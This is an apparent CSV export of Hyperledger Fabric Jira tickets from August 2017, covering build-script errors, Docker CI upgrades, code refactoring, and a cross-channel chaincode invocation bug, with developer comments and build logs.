",,cotofei,muralisr,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzye1z:",,,,,,,,,,,,,,,,,,,,,,,cotofei,muralisr,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,release-1.0,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"24/Aug/17 3:24 PM;cotofei;[~muralisr]

Thank you very much!;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Fabric Video,FAB-5900,20377,,Task,Closed,FAB,Fabric,software,denyeart,,,Medium,Won't Do,joe-alewine,joe-alewine,joe-alewine,24/Aug/17 1:08 PM,30/Jul/19 10:14 AM,28/Oct/23 3:00 AM,30/Jul/19 10:14 AM,,,,,,,,,,,,0,"video,",,,,,,"We need a video to introduce people to Fabric now that it's actually gotten to 1.0 (and beyond) in an enterprise ready state. This would be a high level video about *why* and *what* HF is, not *how* it works, focusing on the current-world problem that HF solves (rather than merely presenting it as a neat innovation). It would be brief (about three minutes or so), fun, and lively.

I've included a shot list/narration to give an idea of what I mean. Any and all comments welcome.",,joe-alewine,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,432000,432000,,0%,432000,432000,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"07/Sep/17 3:13 AM;joe-alewine;Fabric V1 video script.docx;https://jira.hyperledger.org/secure/attachment/12043/Fabric+V1+video+script.docx",,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzye27:",,,,,,,,,,,,,,,,,,,,,,,joe-alewine,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"07/Sep/17 3:13 AM;joe-alewine;Script updated.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"byfn.sh error. ""ERRO 003 Could not find configtx.yaml. Please make sure that FABRIC_CFG_PATH is set to a path which contains configtx.yaml Failed to generate orderer genesis block...""",FAB-5901,20378,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,kchristidis,hazim-j,hazim-j,24/Aug/17 2:52 PM,20/Jul/18 11:14 PM,28/Oct/23 3:00 AM,14/Feb/18 11:54 PM,v1.0.0,,,v1.1.0,,fabric-tools,,,,,,0,,,,,,,"Trying to follow the ""Building your first network"" tutorial and ran into this issue when executing '

byfn.sh -m generate' command.

 
{code:java}
$ sh byfn.sh -m generate

Generating certs and genesis block for with channel 'mychannel' and CLI timeout of '10000'
Continue (y/n)? y
proceeding ...
/cygdrive/c/Users/user/Desktop/fabric-samples/bin/cryptogen

##########################################################
##### Generate certificates using cryptogen tool #########
##########################################################
org1.example.com
org2.example.com

sed: -e expression #1, char 85: unterminated `s' command
sed: -e expression #1, char 85: unterminated `s' command
/cygdrive/c/Users/user/Desktop/fabric-samples/bin/configtxgen
##########################################################
######### Generating Orderer Genesis block ##############
##########################################################
2017-08-24 15:40:41.268 AEST [common/configtx/tool] main -> INFO 001 Loading configuration
2017-08-24 15:40:41.268 AEST [common/configtx/tool/localconfig] Load -> CRIT 002 Error reading configuration: Unsupported Config Type """"
2017-08-24 15:40:41.269 AEST [common/configtx/tool] func1 -> ERRO 003 Could not find configtx.yaml. Please make sure that FABRIC_CFG_PATH is set to a path which contains configtx.yaml
Failed to generate orderer genesis block...{code}","Running on windows 10 64bit,

Docker version 17.06.1-ce, build 874a737,

docker-compose version 1.14.0, build c7bdf9e3,

go version go1.8.3 windows/amd64,

curl 7.55.1 (x86_64-pc-win32)",gregnotso,hazim-j,kchristidis,mastersingh24,sdcho,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-3467,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzye2f:",,,,,,,,,,,,,,,,,,,,,,,gregnotso,hazim-j,kchristidis,mastersingh24,sdcho,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"28/Aug/17 9:28 AM;mastersingh24;[~hazim-j] 
Can you try 
*./byfn.sh -m generate*
instead of 
*sh byfn.sh -m generate*?;;;","04/Sep/17 9:28 PM;mastersingh24;[~hazim-j] Not sure if you are still having issues.  You might want to try the following:

1) Use Git Bash (I think you are using Cygwin?)
2) Pull down the latest version of fabric-samples and also install the [latest binaries|http://hyperledger-fabric.readthedocs.io/en/latest/samples.html#download-platform-specific-binaries]

We'll leave this open for a couple of days, but after that we'll close this as using the prereqs with the latest samples and binaries works fine on Windows 10;;;","08/Sep/17 3:34 PM;sdcho;I also have the exactly the same issue.

I was using bash from PowerShell.

I am using the latest binaries.;;;","08/Sep/17 11:37 PM;sdcho;The problem resolved by running the script under bash provided by git.;;;","16/Sep/17 9:41 PM;sdcho;By running the *byfn.sh*, all the required environment variables such as FABRIC_CFG_PATH is set within the script.

What was preventing the proper running of the script seems like due to different version of sed.

By using git bash instead of cygwin bash did not have any issues.

The difference there is the version of sed.

sed versions:

git sed: 5.4.2

cygwin sed: 4.4;;;","11/Dec/17 3:08 AM;gregnotso;this seems unresolved for 3 months now and still shows up in the latest release or 1.0.5;;;","14/Feb/18 1:42 PM;kchristidis;I know what's wrong here. Will push a fix tomorrow.

The prompt for this was the message posted to the mailing list yesterday: https://lists.hyperledger.org/pipermail/hyperledger-fabric/2018-February/002821.html;;;","14/Feb/18 2:48 PM;kchristidis;https://gerrit.hyperledger.org/r/c/17901/;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Refine Endorser ProcessProposal() code,FAB-5902,20379,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,baohua,baohua,baohua,24/Aug/17 5:38 PM,21/Jul/18 3:49 AM,28/Oct/23 3:00 AM,24/Feb/18 11:22 PM,v1.0.0,v1.0.1,v1.0.2,v1.1.0,,,,,,,,0,,,,,,,"Existing code is too long (over 100 lines).

Separate those check, validation related code into another func of preProcess().

 ",,baohua,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Unset,,,,,,,,,,,,"1|hzye2n:",,,,Unset,,,,,,,,Unset,,,,,,,,,,,baohua,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"24/Aug/17 5:41 PM;baohua;https://gerrit.hyperledger.org/r/12735;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Add statsd reporter,FAB-5903,20380,15982,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,grapebaba,grapebaba,grapebaba,24/Aug/17 5:41 PM,20/Jul/18 11:14 PM,28/Oct/23 3:00 AM,01/Sep/17 5:28 PM,,,,v1.1.0,,fabric-ci,,,,,,0,,,,,,,Add statsd reporter and test,,grapebaba,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzye2v:",,,,,,,,,,,,,,,,,,,,,,,grapebaba,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Upgrade x86 CI env to Docker 17.06+,FAB-5904,20382,19980,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,jwagantall,mastersingh24,mastersingh24,24/Aug/17 9:51 PM,20/Jul/18 11:14 PM,28/Oct/23 3:00 AM,14/Sep/17 1:07 AM,,,,v1.1.0,,fabric-ci,,,,,,0,,,,,,,,,jwagantall,mastersingh24,rameshthoomu,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-5905,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzye33:",,,,,,,,,,,,,,,,,,,,,,,jwagantall,mastersingh24,rameshthoomu,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"31/Aug/17 10:01 PM;rameshthoomu;[~jwagantall] could you please upgrade docker version in sandbox to 17.06.. Let me know once done.. Will test this before you enable this on production minions..;;;","02/Sep/17 9:02 AM;jwagantall;Tested my change locally and works to the lates 17.06 version

 

Testing this change now in the sandbox: https://gerrit.hyperledger.org/r/13103;;;","02/Sep/17 9:52 AM;jwagantall;[~rameshthoomu] the sandbox is now updated. please test it and let me know how it goes.. 

 ;;;","05/Sep/17 11:29 PM;rameshthoomu;[~jwagantall] I see fabric-ca builds are failing after updating docker version 17.06.. not sure below error is related to docker version. Seems
*`libltdl-dev`* package is missing.

Observed below error while build fabric-ca image on {color:#d04437}*Docker version 17.06*{color}
{code:java}
00:15:08.848 Building fabric-ca-server in bin directory ...
00:15:22.230 # github.com/hyperledger/fabric-ca/vendor/github.com/miekg/pkcs11
00:15:22.230 vendor/github.com/miekg/pkcs11/pkcs11.go:29:18: fatal error: ltdl.h: No such file or directory
00:15:22.230 compilation terminated.
00:16:27.233 Makefile:105: recipe for target 'bin/fabric-ca-server' failed
00:16:27.233 make: *** [bin/fabric-ca-server] Error 2
00:16:27.259 Build step 'Execute shell' marked build as failure{code};;;","06/Sep/17 6:20 AM;jwagantall;@rameshthoomu can you test again the sandbox please? both missing packages have been re-added [https://gerrit.hyperledger.org/r/#/c/13103/10/packer/provision/baseline.sh];;;","06/Sep/17 2:09 PM;jwagantall;Let me know if this is ready for production. Looks like these 2 errors were fixed in the latest image. ;;;","14/Sep/17 1:05 AM;rameshthoomu;Docker version 17.06.02-ce and docker-compose version 1.16.1 has been updated in x86_64 production minions. Closing this issue.;;;","14/Sep/17 1:06 AM;rameshthoomu;{code:java}
00:01:05.287 + docker version
00:01:05.307 Client:
00:01:05.307  Version:      17.06.2-ce
00:01:05.308  API version:  1.30
00:01:05.309  Go version:   go1.8.3
00:01:05.309  Git commit:   cec0b72
00:01:05.310  Built:        Tue Sep  5 20:00:17 2017
00:01:05.311  OS/Arch:      linux/amd64
00:01:05.311 
00:01:05.311 Server:
00:01:05.312  Version:      17.06.2-ce
00:01:05.313  API version:  1.30 (minimum version 1.12)
00:01:05.314  Go version:   go1.8.3
00:01:05.315  Git commit:   cec0b72
00:01:05.315  Built:        Tue Sep  5 19:59:11 2017
00:01:05.316  OS/Arch:      linux/amd64{code}
{code:java}
00:01:05.369 + docker-compose version
00:01:07.076 docker-compose version 1.16.1, build 6d1ac21{code};;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Upgrade PPE CI env to Docker 17.06+,FAB-5905,20383,19980,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,rameshthoomu,mastersingh24,mastersingh24,24/Aug/17 9:52 PM,20/Jul/18 11:14 PM,28/Oct/23 3:00 AM,08/Sep/17 10:57 PM,,,,v1.1.0,,fabric-ci,,,,,,0,,,,,,,,,harsha544,mastersingh24,rameshthoomu,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-5906,,,FAB-5904,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzye3b:",,,,,,,,,,,,,,,,,,,,,,,harsha544,mastersingh24,rameshthoomu,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"31/Aug/17 9:58 PM;rameshthoomu;upgraded docker version to 17.06 in power sandbox machine and tested unit-tests.. Will update the same on all machines once testing is done.;;;","05/Sep/17 11:00 PM;rameshthoomu;Observed below error while build fabric-ca image on {color:#d04437}*Docker version 17.06*{color}
{code:java}
00:15:08.848 Building fabric-ca-server in bin directory ...
00:15:22.230 # github.com/hyperledger/fabric-ca/vendor/github.com/miekg/pkcs11
00:15:22.230 vendor/github.com/miekg/pkcs11/pkcs11.go:29:18: fatal error: ltdl.h: No such file or directory
00:15:22.230 compilation terminated.
00:16:27.233 Makefile:105: recipe for target 'bin/fabric-ca-server' failed
00:16:27.233 make: *** [bin/fabric-ca-server] Error 2
00:16:27.259 Build step 'Execute shell' marked build as failure{code}
No issues observed on {color:#d04437}*Docker 1.12.6*{color}
{code:java}
00:05:06.364 All files are properly formatted
00:05:06.841 Building fabric-ca-server in bin directory ...
00:05:50.123 Built bin/fabric-ca-server
00:05:50.130 Building fabric-ca-client in bin directory ...
00:06:32.837 Built bin/fabric-ca-client
00:06:32.840 Running all tests ...{code};;;","07/Sep/17 12:42 AM;rameshthoomu;Ignore above error.. Tested fabric changes on {color:#d04437}*docker 17.06*{color} and it worked as expected. I have asked [~harsha544] to update docker on production power nodes. Will close this ticket once this is done.;;;","07/Sep/17 12:48 AM;harsha544;[~rameshthoomu] have updated production power nodes (-10,-11,-12) to have {color:#ff0000}docker 17.06{color} and {color:#ff0000}docker-compose=1.15{color} in place.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Upgrade s390 / Z  CI env to Docker 17.06+,FAB-5906,20384,19980,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,rameshthoomu,mastersingh24,mastersingh24,24/Aug/17 9:53 PM,20/Jul/18 11:14 PM,28/Oct/23 3:00 AM,08/Sep/17 10:58 PM,,,,v1.1.0,,fabric-ci,,,,,,0,,,,,,,,,mastersingh24,rameshthoomu,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-5905,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzye3j:",,,,,,,,,,,,,,,,,,,,,,,mastersingh24,rameshthoomu,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"31/Aug/17 9:59 PM;rameshthoomu;upgraded docker version to 17.06 in *z* *sandbox* machine and tested unit-tests.. Will update the same on all machines once testing is done. Also, I see a maintenance window scheduled on all *z production* machines.;;;","07/Sep/17 12:43 AM;rameshthoomu;Ignore above error.. Tested fabric changes on {color:#d04437}*docker 17.06*{color} and it worked as expected. I have asked [~harrijk] to update docker on production power nodes. Will close this ticket once this is done.;;;","08/Sep/17 10:58 PM;rameshthoomu;This has been implemented on production z nodes.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Connect endorser and private data coordinator,FAB-5907,20385,18792,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,yacovm,yacovm,yacovm,24/Aug/17 10:04 PM,20/Jul/18 11:14 PM,28/Oct/23 3:00 AM,03/Sep/17 10:43 PM,,,,,,fabric-gossip,fabric-peer,,,,,0,,,,,,,,,yacovm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzye3r:",,,,,,,,,,,,,,,,,,,,,,,yacovm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
incorporate cello in automated tests to deploy networks,FAB-5911,20392,,Story,Closed,FAB,Fabric,software,denyeart,,,High,Won't Do,,scottz,scottz,25/Aug/17 2:09 AM,30/Jul/19 10:10 AM,28/Oct/23 3:00 AM,30/Jul/19 10:10 AM,v1.0.1,,,,,fabric-quality,,,,,,1,,,,,,,"It is desirable to have a single easy way to deploy a network. All external users and many internal users could benefit from cello, instead of maintaining their own startup scripts which require an ongoing cost to maintain as fabric evolves. Cello is recommended by fabric team as the supported way to spin up a network. If the Cello team incorporates fabric changes to certs, directories, setup sequences, etc, then many other teams would not have to duplicate their efforts. By incorporating cello within automated tests run daily, it will support cello team by proving in their work, and will enable other teams to focus on their application work. And it would be a huge benefit to external user community, who is currently struggling with setting up networks.

Set up a submodule for cello inside fabric-test repo.

Define default network configuraiton yaml file and provide Readme file explanation how to use it, including how to choose singlehost or multihost, and and how to set config variables defined in core.yaml and configtx.yaml etc.

And revise automated tests as needed to use this cello-initiated network for:
 * e2e tests and other CI tests in daily test suite
 * behave tests
 * performance system tests
 * other integration tests and peer tests from the v1.0 SVT which require a full network",,inatatsu,scottz,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Unset,,,,,,,,,,,,"1|hzye4f:",,,,Unset,,Sprint 19 - Quality,,,,,,Unset,,,,,,,,,,,inatatsu,scottz,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
chaincode tests are failing,FAB-5912,20393,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,muralisr,muralisr,muralisr,25/Aug/17 3:42 AM,20/Jul/18 11:14 PM,28/Oct/23 3:00 AM,18/Oct/17 5:44 AM,,,,,,fabric-peer,,,,,,0,,,,,,,Merge of https://gerrit.hyperledger.org/r/#/c/12515  crossed another previous merge (not the fault of either but purely due to 12515 being on hold for a while) which required chaincode framework's authenticator to be initialized.,,denyeart,muralisr,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzye4n:",,,,,,,,,,,,,,,,,,,,,,,denyeart,muralisr,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"18/Oct/17 5:43 AM;denyeart;https://gerrit.hyperledger.org/r/#/c/12763/;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
balance-transfer: queryChaincode fails to select peer,FAB-5913,20406,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,yuki-kon,yuki-kon,yuki-kon,25/Aug/17 6:06 AM,21/Jul/18 3:50 AM,28/Oct/23 3:00 AM,31/Jan/18 4:13 AM,v1.0.0,v1.0.1,,v1.1.0,,fabric-samples,,,,,,0,,,,,,,"In fabric-samples/balance-transfer/app/query.js, ""queryChaincode"" fails to select peer.
""queryChaincode"" has “peer“ as an args to select a target peer to get ledger's data.
""queryChaincode"" calls channel.queryByChaincode like the below. Target peer is not included in request object.

{code:java}
return channel.queryByChaincode(request, target);
{code}

channel.queryByChaincode accepts target peer as a var in request object. As a result, target peer designated like the above is ignored and transaction proposal is sent to default peers (i.e. peer1 & peer2).
Target peer should be put into request object.

In addition, ""queryChaincode"" doesn’t output responses from all peers in log message. It exits the loop processing after outputting the first response like the below.
We should print all responses from all peers. Also, we should return a response (e.g. the response_payloads[0]) after the loop.

{code:java}
for (let i = 0; i < response_payloads.length; i++) {
                logger.info(args[0]+' now has ' + response_payloads[i].toString('utf8') +
                                ' after the move');
                return args[0]+' now has ' + response_payloads[i].toString('utf8') +
                                ' after the move';
}
{code}
",fabric-samples commit 7cca09f0470eceabc233018e7a9ae48a88487218,mastersingh24,yuki-kon,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Unset,,,,,,,,,,,,"1|hzye4v:",,,,Unset,,,,,,,,Unset,,,,,,,,,,,mastersingh24,yuki-kon,,,,,,,,,,,,,,,,,,,,,,,,,,,,,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/protobufjs-6.11.4,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/tough-cookie-4.1.3,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/semver-6.3.1,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/grpc/grpc-js-1.8.17,dependabot/go_modules/high-throughput/application-go/google.golang.org/grpc-1.53.0,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/word-wrap-1.2.4,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/protobufjs-and-fabric-network-7.2.4,dependabot/go_modules/asset-transfer-basic/application-go/google.golang.org/grpc-1.53.0,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"25/Aug/17 6:57 AM;yuki-kon;CR is posted here: https://gerrit.hyperledger.org/r/#/c/12765/;;;","01/Oct/17 3:30 AM;mastersingh24;I'm going to mark this as an improvement and target for 1.1.
It's a fine line, but the goal was to keep things simple the first time around so this is an improvement;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Some error log in chaincode handler is not formatted properly,FAB-5914,20407,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,shimos,shimos,shimos,25/Aug/17 8:33 AM,20/Jul/18 11:14 PM,28/Oct/23 3:00 AM,01/Oct/17 3:24 AM,v1.0.0,v1.0.1,,v1.1.0,,fabric-peer,,,,,,0,,,,,,,"Some error messages in the chaincode handler are not formatted correctly.
For example, a CouchDB query in the transaction which has been timed out produced error log like:

{noformat}
2017-08-24 22:36:48.521 UTC [chaincode] afterQueryStateClose -> DEBU 5805f Received QUERY_STATE_CLOSE, invoking query state close from ledger
2017-08-24 22:36:48.521 UTC [chaincode] afterQueryStateClose -> DEBU 58060 Exiting QUERY_STATE_CLOSE
2017-08-24 22:36:48.521 UTC [chaincode] filterError -> DEBU 58061 Ignoring NoTransitionError: no transition
2017-08-24 22:36:48.521 UTC [chaincode] 2 -> ERRO 58062 [[fe8f960c ERROR]]Failed to get transaction context. Sending %!s(MISSING)
2017-08-24 22:36:48.521 UTC [chaincode] 1 -> DEBU 58063 [fe8f960c]handleQueryStateClose serial send ERROR
{noformat}

""%!s(MISSING)"" definitely comes from wrong formatting in golang.
",fabric commit 22f39c7899da3c9974b37df4956f909fb44032e1,shimos,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-4208,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzye53:",,,,,,,,,,,,,,,,,,,,,,,shimos,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"25/Aug/17 8:49 AM;shimos;CR: https://gerrit.hyperledger.org/r/12769;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
common/tools/cryptogen has some spelling error,FAB-5916,20410,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,TopJohn,TopJohn,TopJohn,25/Aug/17 2:36 PM,20/Jul/18 11:14 PM,28/Oct/23 3:00 AM,18/Oct/17 7:08 AM,,,,,,fabric-crypto,,,,,,0,common-components,,,,,,common/tools/cryptogen has some spelling error,,TopJohn,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzye5j:",,,,,,,,,,,,,,,,,,,,,,,TopJohn,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Network Launcher: creates both PTE sc json and yaml files,FAB-5920,20420,,Task,Closed,FAB,Fabric,software,denyeart,,,Medium,Won't Do,dongming,dongming,dongming,26/Aug/17 3:03 AM,11/Jan/21 2:36 AM,28/Oct/23 3:00 AM,11/Jan/21 2:36 AM,,,,,,fabric-quality,,,,,,0,,,,,,,Network Launcher creates both PTE service credential json and yaml files,,btl5037,dongming,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-6742,,,,,,,,,"1|hzyee7:",,,,,,,,,,,,,,,,,,,,,,,btl5037,dongming,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"01/May/19 5:36 AM;dongming;https://gerrit.hyperledger.org/r/#/c/31148/;;;","11/Jan/21 2:11 AM;btl5037;As part of backlog grooming closing issue as stale. Issue can be reopened in the future.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Chaincode invoke across channels to same chaincode fails,FAB-5921,20421,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,muralisr,jeffgarratt,jeffgarratt,26/Aug/17 4:15 AM,20/Jul/18 11:14 PM,28/Oct/23 3:00 AM,10/Nov/17 7:25 AM,,,,,,fabric-peer,,,,,,0,chaincode,,,,,,It appears there is an issue invoking the same chaincode across channels wrt to context management.  [~muralisr] has tentatively confirmed and will be assigned.  This was identified during safe asset transfer development.,,denyeart,jeffgarratt,mastersingh24,muralisr,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-5999,,,,,,,,,,,,,,,,,,,,FAB-6889,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzyeef:",,,,,,,,,,,,,,,,,,,,,,,denyeart,jeffgarratt,mastersingh24,muralisr,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,purge-pd,main-emeritius,main,correct-nodeenv-version,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"29/Aug/17 12:53 AM;muralisr;This is an issue with the narrow case of a chaincode calling the SAME chaincode on another channel. Currently the code prevents loops in chaincode invocation by tracking transaction IDs in use. It does not disambiguate the case of the same chaincode being called on another channel (which is not really a ""loop"").

Two ways to handle this
# add channel id to txid tracker to disambiguate - this is a clean solution but would need all chaincode platforms to pass back channelID on GET,PUT,... requests to the peer. This will break compatibility with 1.0 chaincode deployments as they will not be passing back channel ID. 
# create a new transaction (txid+channel) to associate with the called chaincode (same chaincode on another channel). This is not a bad solution especially since the cross channel chaincode call is read-only. This will not break compatibility. The only negative is that if the chaincode calls GetTxID it will see ""channel+txid"".  But as this a read only call that does not affect state, this may be ok.

This is a bug and not really a feature we could introduce via compatibility work. So if we are doing (1) we better do so immediately. 

[~binhn] [~mastersingh24] [~jeffgarratt];;;","30/Aug/17 12:40 AM;jeffgarratt;Spoke with [~muralisr], asked that we try with the chaincode on channel 2 having a different name.  Gonna give that a go.;;;","08/Sep/17 4:41 AM;muralisr;option 1 would cause compatibility issues with deployed chaincode images...linking to JIRA-5999;;;","27/Oct/17 2:38 AM;muralisr;[~jimthematrix@gmail.com]  [~sanchezl]  [~denyeart] [~mastersingh24]  fixing this properly per option 1 would need change to proto.ChaincodeMessage to have a channel field. On the plus side we can now have a GetChannelID query on the chaincode. On the minus side we would have to change java and node chaincode shims. My recommendation would be to bite the bullet and change now (I have the code ready for GO side and can coordinate to work on node and java chaincodes as well). 

